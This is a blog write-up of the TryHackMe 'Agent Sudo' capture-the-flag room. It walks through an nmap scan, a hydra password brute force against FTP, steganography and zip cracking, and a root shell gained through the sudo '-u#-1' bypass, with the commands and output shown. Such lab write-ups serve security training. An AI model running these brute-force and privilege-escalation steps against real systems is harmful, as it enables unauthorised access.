@@ -1,0 +1,348 @@
+I"�+<h2 id="description">Description:</h2>
+
+<p>The Following Post is writeup of Agent Sudo room of tryhackme <a href="https://tryhackme.com/room/agentsudoctf">https://tryhackme.com/room/agentsudoctf</a></p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Machine</th>
+      <th style="text-align: left">Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">OS</td>
+      <td style="text-align: left">linux</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Rating</td>
+      <td style="text-align: left">Easy</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Creator</td>
+      <td style="text-align: left">DesKel</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="summary">Summary:</h2>
+
+<p>PortScan will give you 3 open ports 21,22 and 80. When we go to port 80 we can see a message to change useragent
+  we changed it to C and boom landed upon secret page. From here we logged into ftp and extracted some files. Zip Crack and
+  Steganography all the way. Now we have another username and password. Now sudo exploit.</p>
+
+<h2 id="walkthrough">Walkthrough:</h2>
+
+<h3 id="enumeration">Enumeration</h3>
+<p>Lets start with nmap scan</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-T4</span> 10.10.144.201 <span class="nt">-v</span>
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-02 10:22 EDT
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.00s elapsed
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.00s elapsed
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.00s elapsed
+Initiating Ping Scan at 10:22
+Scanning 10.10.144.201 [2 ports]
+Completed Ping Scan at 10:22, 0.21s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:22
+Completed Parallel DNS resolution of 1 host. at 10:22, 0.10s elapsed
+Initiating Connect Scan at 10:22
+Scanning 10.10.144.201 [1000 ports]
+Discovered open port 21/tcp on 10.10.144.201
+Discovered open port 80/tcp on 10.10.144.201
+Discovered open port 22/tcp on 10.10.144.201
+Increasing send delay for 10.10.144.201 from 0 to 5 due to 47 out of 117 dropped probes since last increase.
+Completed Connect Scan at 10:22, 14.29s elapsed (1000 total ports)
+Initiating Service scan at 10:22
+Scanning 3 services on 10.10.144.201
+Completed Service scan at 10:22, 6.46s elapsed (3 services on 1 host)
+NSE: Script scanning 10.10.144.201.
+Initiating NSE at 10:22
+Completed NSE at 10:22, 7.03s elapsed
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.96s elapsed
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.00s elapsed
+Nmap scan report for 10.10.144.201
+Host is up (0.20s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+</span><span class="gp">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey:
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Annoucement
+</span><span class="gp">Service Info: OSs: Unix, Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
+<span class="go">
+NSE: Script Post-scanning.
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.00s elapsed
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.00s elapsed
+Initiating NSE at 10:22
+Completed NSE at 10:22, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.66 seconds
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Start our enum for port 80</p>
+
+<blockquote>
+  <p>Dear agents,</p>
+</blockquote>
+
+<blockquote>
+  <p>Use your own codename as user-agent to access the site.</p>
+</blockquote>
+
+<blockquote>
+  <p>From,<br />
+Agent R</p>
+</blockquote>
+
+<blockquote>
+  <p>try user agent C</p>
+</blockquote>
+
+<h4 id="secret-page">Secret Page</h4>
+
+<blockquote>
+  <p>Attention chris,</p>
+</blockquote>
+
+<blockquote>
+  <p>o you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</p>
+</blockquote>
+
+<blockquote>
+  <p>From,<br />
+Agent R</p>
+</blockquote>
+
+<p>So indeed the password is weak let’s brute force ssh or ftp</p>
+
+<p>I tried both but got success in vsftpd</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span>hydra <span class="nt">-l</span> chris <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt ftp://10.10.144.201
+<span class="go">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-02 10:28:58
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ftp://10.10.144.201:21/
+</span><span class="gp">[21][ftp] host: 10.10.144.201   login: chris   password: &lt;redacted&gt;</span><span class="w">
+</span><span class="go">[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 1 to do in 00:01h, 15 active
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-02 10:30:02
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td> --><td class="rouge-code"><pre><span class="go">Let's check files
+
+-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>cat To_agentJ.txt</p>
+
+<blockquote>
+  <p>Dear agent J,</p>
+</blockquote>
+
+<blockquote>
+  <p>All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn’t be a problem for you.</p>
+</blockquote>
+
+<blockquote>
+  <p>From,
+Agent C</p>
+</blockquote>
+
+<p>Another message<br />
+Let’s check for Steganography</p>
+
+<p>Binwalk</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span>binwalk cutie.png
+<span class="go">
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Use john to crack the zip pass then we will get a Message</p>
+
+<blockquote>
+  <p>Agent C,</p>
+</blockquote>
+
+<blockquote>
+  <p>We need to send the picture to ‘QXJ…..’ as soon as possible!</p>
+</blockquote>
+
+<blockquote>
+  <p>By,
+Agent R</p>
+</blockquote>
+
+<p>Hmmmm interesting let’s check where we can put this password
+I pretty much stuck but after a thought i got it</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="gp">└──╼ $</span><span class="nb">base64</span> <span class="nt">-d</span> rand.txt
+<span class="gp">&lt;redacted&gt;</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>hahha worked and got message.txt</p>
+
+<blockquote>
+  <p>Hi james,</p>
+</blockquote>
+
+<blockquote>
+  <p>Glad you find this message. Your login password is hackerrules!</p>
+</blockquote>
+
+<blockquote>
+  <p>Don’t ask me why the password look cheesy, ask agent R who set this password for you.</p>
+</blockquote>
+
+<blockquote>
+  <p>Your buddy
+chris</p>
+</blockquote>
+
+<p>For real i stuck a bit here and ran exploit suggester but got nothing
+Then I feel noob when i ran this and my mind sudenly hit</p>
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre><span class="gp">james@agent-sudo:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">[sudo] password for james:
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Yup sudo exploit</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre><span class="gp">james@agent-sudo:/tmp$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+<span class="gp">root@agent-sudo:/tmp#</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Damn Good Rooted</p>
+
+<blockquote>
+  <p>To Mr.hacker,</p>
+</blockquote>
+
+<blockquote>
+  <p>Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine.</p>
+</blockquote>
+
+<blockquote>
+  <p>Your flag is</p>
+</blockquote>
+<redacted>
+
+&gt;By,
+<redacted> a.k.a Agent R
+</redacted></redacted>
+:ET
